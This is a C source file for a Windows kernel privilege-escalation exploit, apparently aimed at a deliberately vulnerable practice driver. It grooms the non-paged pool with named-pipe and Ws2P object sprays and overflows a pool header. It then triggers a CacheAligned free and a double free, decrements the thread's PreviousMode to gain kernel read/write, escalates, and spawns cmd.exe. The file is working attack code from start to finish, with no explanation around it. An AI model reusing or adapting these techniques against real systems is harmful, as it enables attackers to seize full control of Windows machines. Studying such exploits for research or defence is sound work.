#include "../Banzi/banzi.h"

#define ADD		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DELE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define EDIT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define SHOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct request {
	DWORD64 size;
	POOL_TYPE poolType;
	void* buffer;
}request;

void add(DWORD64 size, POOL_TYPE pooType) {
	DWORD retLength = 0;
	DWORD64 address = 0;
	request req = { size, pooType, NULL };
	DeviceIoControl(hDevice, ADD, &req, sizeof(request), &address, 8, &retLength, NULL);
	info("[+] chunk address: %p", address);
}

void dele() {
	DWORD retLength = 0;
	request req = { 0, NonPagedPool, NULL };
	DeviceIoControl(hDevice, DELE, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

void edit(DWORD64 size, void* buffer) {
	DWORD retLength = 0;
	request req = { size, NonPagedPool, buffer };
	DeviceIoControl(hDevice, EDIT, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

int main() {
	char inBuffer[1024] = { 0 };
	char outBuffer[1024] = { 0 };
	DWORD retLenth = 0;

	init("\\\\.\\MyDeviceSymLink");
	canSprayObjects();
	getSomeKernelAddress();

	PPIPE_HANDLES pHandles0 = initSprayNamedPipe(0x120, 0x100);
	PPIPE_HANDLES pHandles1 = initSprayNamedPipe(0x120, 0x100);
	PPIPE_HANDLES pHandles2 = initSprayNamedPipe(0x120, 0x300);
	PHANDLES pHandles3 = initSprayWs2P(0x400);

	info("[+] Spray some pool object to groom pool");
	sprayNpFrByPipe(pHandles0, NULL);
	add(0x110, (POOL_TYPE)(NonPagedPoolNx));
	sprayNpFrByPipe(pHandles1, NULL);

	info("[+] Pool overflow to rewrite next pool header");
	memset(inBuffer, 'B', sizeof(inBuffer));
	*(DWORD64*)(inBuffer + 0x110) = 0x4142424106120012;
	edit(0x110 + 0x4, inBuffer);
	
	info("[+] Trigger CacheAlign Attack to free vuln pool chunk");
	closePipeHandles(pHandles0);
	closePipeHandles(pHandles1);

	info("[+] Spray W2sP objects to occupy vuln pool chunk");
	sprayW2sP(pHandles3);

	info("[+] Double Free vuln pool chunk");
	dele();

	info("[+] Spray Io objects to occupy vuln pool chunk");
	*(DWORD64*)(inBuffer + 0x00) = 0x00000000636f7250;
	*(DWORD64*)(inBuffer + 0x38) = kAddress.curThread + 0x30 + 0x232;
	sprayIoByPipe(pHandles2, inBuffer);

	info("[+] Free W2sP objects to trigger arbtirary dec PreviousMode");
	freeW2sP(pHandles3);

	info("[+] Try to escalate");
	escalateByPreviousMode();
	system("cmd.exe");
	getchar();
	return 0;
}
